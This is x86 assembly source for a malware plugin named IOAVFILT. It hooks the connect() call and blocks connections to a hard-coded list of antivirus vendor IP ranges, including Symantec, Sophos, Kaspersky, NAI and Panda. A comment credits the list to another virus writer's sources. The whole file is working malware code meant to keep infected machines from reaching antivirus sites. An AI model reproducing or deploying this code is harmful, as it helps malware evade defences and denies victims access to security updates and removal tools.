   ; IOAVFILT
   ; ~~~~~~~~
   ; - av IP blocker

   include                 INCLUDE\consts.inc
   include                 iohooker.inc
   include                 rxio.inc

   include                 plugin.inc
                           PLUGIN_START    IOAVFILT, CODE32, NON_PERMUTABLE

   handleevent:            hookevent EV_IOHOOKER_ON_CONNECT, onconnect
                           stc
                           retn

   ; output: handle event (CF==0), to fuckup connect()

   onconnect:              pusha

                           mov     ecx, [edx+4]    ; arg2 = sockaddr
                           mov     eax, [ecx+4]    ; sin_addr

                           and     eax, 00FFFFFFh  ; x.x.x.*

                           getofs  edi, ip_sux
                           mov     ecx, ip_sux_entries
                           cld
                           repnz   scasd
                           je      __fux0r         ; deny access if IP found

                           popa
                           stc     ; normal process, keep event
                           retn

   __fux0r:                popa
                           clc     ; event handled --> fuckup connect()
                           retn

   ip_sux:

   ;----------------------------------------------------------------------------
   ; AV_IP.INC [15-07-00]
   ; taken from Vecna's srcs.
   ;----------------------------------------------------------------------------
   db 161,69,3,0           ; www.nai.com
   db 167,216,243,0        ; www.fsecure.com
   db 193,230,245,0        ; www.rav.ro
   db 193,247,150,0        ; www.avp.ch
   db 193,4,210,0          ; melona.complex.is
   db 193,71,68,0          ; www.norman.no
   db 193,80,242,0         ; www.ikarus.at
   db 193,82,145,0         ; calgary.virusbtn.com
   db 193,87,241,0         ; www.eset.sk
   db 194,102,118,0        ; ftp0.rav.ro
   db 194,108,145,0        ; www.anet.cz
   db 194,135,30,0         ; www.dials.ru
   db 194,203,134,0        ; s-utsire.sophos.com
   db 194,30,32,0          ; www.pandasoftware.com
   db 195,116,5,0          ; www.mks.com.pl
   db 195,170,248,0        ; www.kasperskylabs.com
   db 195,2,65,0           ; ftp.avp.ru
   db 195,2,83,0           ; www.avp.ru
   db 198,85,228,0         ; www.stiller.com
   db 203,89,233,0         ; www.vet.com.au
   db 205,178,21,0         ; www.zonelabs.com
   db 206,204,104,0        ; www.symantec.com
   db 206,204,212,0        ; www.symantec.com
   db 207,188,145,0        ; www.moosoft.com
   db 207,227,40,0         ; www.grisoft.com
   db 207,230,123,0        ; quickheal.com
   db 207,8,185,0          ; www.wildlist.org
   db 208,226,13,0         ; www.netpro.com
   db 208,226,167,0        ; www.symantec.com
   db 208,234,234,0        ; abpro200.commandcom.com
   db 209,11,8,0           ; www.aks.com
   db 209,130,127,0        ; www.irisav.com
   db 209,130,48,0         ; www.emdent.com
   db 209,132,17,0         ; www.chekware.com
   db 212,20,224,0         ; www.calluna.com
   db 212,29,228,0         ; www.invircible.com
   db 212,60,168,0         ; www.dataprot.com
   db 216,122,141,0        ; www.avp.com
   db 216,122,8,0          ; www.avp.com
   db 216,33,21,0          ; antivirus.com
   db 216,33,22,0          ; antivirus.com
   db 216,35,137,0         ; www.symantec.com
   ;----------------------------------------------------------------------------

   ip_sux_entries          equ     ($-ip_sux)/4

                           PLUGIN_END
